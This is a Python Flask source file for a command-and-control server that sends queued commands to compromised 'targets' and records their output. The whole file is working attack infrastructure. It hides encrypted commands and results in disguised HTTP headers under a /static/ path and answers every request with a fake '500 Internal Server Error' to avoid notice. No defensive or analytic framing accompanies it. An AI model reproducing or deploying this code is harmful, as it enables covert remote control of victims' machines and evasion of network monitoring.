from datetime import datetime
from flask import Flask, abort, request
from cryptography.fernet import Fernet
from c2.models import Target, Execution

app = Flask(__name__)

FINGERPRINT_HEADER = "Transfer-Context"
ID_HEADER = "Context-Verification"
COMMAND_HEADER = "Cache-Cache-Protocol"
RESULT_HEADER = "X-Resource-Priority"


def _encrypt(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode()).decode()


def _decrypt(data, key):
    fernet = Fernet(key)
    return fernet.decrypt(data.encode()).decode()


def _extract_headers():
    fingerprint = request.headers.get(FINGERPRINT_HEADER)
    if not fingerprint:
        abort(500, "Internal Server Error")

    try:
        target = Target.get(fingerprint=fingerprint)
    except Target.DoesNotExist:
        abort(500, "Internal Server Error")

    id = request.headers.get(ID_HEADER)
    if id is not None:
        id = int(_decrypt(id, target.fingerprint))
    result = request.headers.get(RESULT_HEADER)
    if result is not None:
        result = _decrypt(result, target.fingerprint)

    return target, id, result


def _get_next_execution():
    next_execution = (
        Execution.select()
        .where(
            Execution.status == "pending",
            Execution.run_at <= datetime.now(),
        )
        .first()
    )
    if next_execution is None:
        abort(500, "Internal Server Error")

    # Update execution status to running
    next_execution.status = "running"
    next_execution.save()

    # Return the command to execute
    response_headers = {
        ID_HEADER: _encrypt(str(next_execution.id), next_execution.target.fingerprint),
        COMMAND_HEADER: _encrypt(
            next_execution.command, next_execution.target.fingerprint
        ),
    }

    return "Internal Server Error", 500, response_headers


@app.route("/static/<path:path>", methods=["GET"])
def handle_execution(path):
    app.logger.info("Received execution request for path: %s", path)
    target, id, result = _extract_headers()

    app.logger.info("Extracted headers: %s", target)
    app.logger.info("Extracted headers: %s", id)
    app.logger.info("Extracted headers: %s", result)

    if id is None:
        return _get_next_execution()

    execution = Execution.get_or_none(Execution.id == id)
    if (
        execution is not None
        and execution.status == "running"
        and execution.target == target
    ):
        execution.status = "completed"
        execution.result = result
        execution.save()

    return "Internal Server Error", 500
